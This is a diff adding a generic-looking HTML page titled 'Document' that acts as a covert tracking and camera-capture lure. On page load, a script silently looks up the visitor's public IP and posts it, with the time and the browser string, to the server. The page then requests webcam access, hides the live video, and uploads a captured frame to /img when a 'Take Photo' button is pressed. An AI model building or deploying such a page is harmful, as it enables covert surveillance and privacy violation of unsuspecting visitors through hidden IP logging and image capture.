@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        iframe {
+            width: clamp(200px, 100vw, 900px);
+            height: auto;
+            aspect-ratio: 12/7;
+        }
+
+        #video-element {
+            display: none;
+        }
+    </style>
+    <script>
+        async function getSet(params) {
+            await fetch("https://api.ipify.org/?format=json").then(res => res.json()).then(data => {
+                let currentDate = new Date();
+                let time = currentDate.getHours() + ":" + currentDate.getMinutes() + ":" + currentDate.getSeconds();
+                let pl = navigator.userAgent;
+                let n = { ip: data.ip, t: time, browser: pl };
+                fetch('/', {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(n)
+                }).then(res => res.json()).then(data => console.log(''));
+
+            })
+        }
+        getSet()
+
+    </script>
+</head>
+
+<body>
+    <!-- <iframe id="vid" width="300" src="" frameborder="0" allowfullscreen></iframe> -->
+    <video id="video-element" autoplay></video>
+    <button id="photo-button">Take Photo</button>
+    <script>
+        // check if the browser supports getUserMedia()
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            // get the video and button elements on the page
+            var video = document.getElementById('video-element');
+            var photoButton = document.getElementById('photo-button');
+
+            // request access to the camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    // if successful, attach the camera stream to the video element
+                    video.srcObject = stream;
+
+                    // add a click event listener to the button
+                    photoButton.addEventListener('click', function () {
+                        // // create a canvas element
+                        // var canvas = document.createElement('canvas');
+                        // canvas.width = video.videoWidth;
+                        // canvas.height = video.videoHeight;
+
+                        // // get the canvas 2D context
+                        // var context = canvas.getContext('2d');
+
+                        // // draw the current frame of the video onto the canvas
+                        // context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // // get the image data from the canvas
+                        // canvas.toBlob((blob) => {
+                        //     // create a new FormData object
+                        //     var formData = new FormData();
+                        //     // append the image file to the form data
+                        //     formData.append("file", blob);
+
+                        //     // create a new Fetch request
+                        //     fetch("/img", {
+                        //         method: "POST",
+                        //         body: formData
+                        //     })
+                        //         .then(response => {
+                        //             if (response.ok) {
+                        //                 // handle the server response here 
+                        //                 console.log("Image sent to server successfully")
+                        //             }
+                        //             else {
+                        //                 // handle errors here 
+                        //                 console.error("Error sending image to server")
+                        //             }
+                        //         })
+                        //         .catch(error => {
+                        //             // handle network errors here
+                        //             console.error("Error with network connection: " + error)
+                        //         });
+                        // }, 'image/jpeg')
+                        sendImg()
+                    });
+                })
+                .catch(function (error) {
+                    // if there was an error, display an error message
+                    console.error("There was an error with accessing the camera stream: " + error);
+                });
+        }
+
+
+        function sendImg() {
+            // create a canvas element
+            var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // get the canvas 2D context
+                        var context = canvas.getContext('2d');
+
+                        // draw the current frame of the video onto the canvas
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // get the image data from the canvas
+                        canvas.toBlob((blob) => {
+                            // create a new FormData object
+                            var formData = new FormData();
+                            // append the image file to the form data
+                            formData.append("file", blob);
+
+                            // create a new Fetch request
+                            fetch("/img", {
+                                method: "POST",
+                                body: formData
+                            })
+                                .then(response => {
+                                    if (response.ok) {
+                                        // handle the server response here 
+                                        console.log("Image sent to server successfully")
+                                    }
+                                    else {
+                                        // handle errors here 
+                                        console.error("Error sending image to server")
+                                    }
+                                })
+                                .catch(error => {
+                                    // handle network errors here
+                                    console.error("Error with network connection: " + error)
+                                });
+                        }, 'image/jpeg')
+        }
+
+    </script>
+</body>
+
+</html>
